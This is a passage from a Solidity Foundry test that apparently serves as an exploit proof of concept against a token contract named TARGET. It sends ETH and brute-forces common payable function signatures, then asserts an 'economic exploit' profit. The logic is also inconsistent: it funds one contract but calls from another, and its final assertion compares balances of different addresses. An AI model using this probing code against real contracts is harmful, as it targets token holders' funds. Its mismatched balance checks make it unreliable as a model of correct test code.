        uint256 initialBalance = IERC20(TARGET).balanceOf(address(attackContract));
        console.log("Initial token balance:", initialBalance);

        // Send ETH to the contract to see if it triggers minting
        // We need some ETH first
        deal(address(attackContract), 10 ether);

        // Try calling the contract with ETH via low-level call
        (bool success, ) = TARGET.call{value: 1 ether}("");
        require(success, "ETH transfer failed");

        // Check if we got any tokens
        uint256 afterBalance = IERC20(TARGET).balanceOf(address(attackContract));
        console.log("After ETH transfer token balance:", afterBalance);

        // If no tokens, maybe there's a specific function to call
        // Let's try to find any payable function by checking common function signatures
        bytes4[] memory commonPayableSigs = new bytes4[](3);
        commonPayableSigs[0] = bytes4(keccak256("mint()"));
        commonPayableSigs[1] = bytes4(keccak256("buy()"));
        commonPayableSigs[2] = bytes4(keccak256("mint(address)"));

        for (uint i = 0; i < commonPayableSigs.length; i++) {
            (bool callSuccess, ) = TARGET.call{value: 0.1 ether}(abi.encodePacked(commonPayableSigs[i]));
            if (callSuccess) {
                console.log("Found payable function at sig:", uint32(commonPayableSigs[i]));
                break;
            }
        }

        // Check final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(address(attackContract));
        console.log("Final token balance:", finalBalance);

        // The oracle expects attacker balance increased
        assertGt(finalBalance, initialBalance, "Token balance should increase");
        uint256 finalAttackerBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalAttackerBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

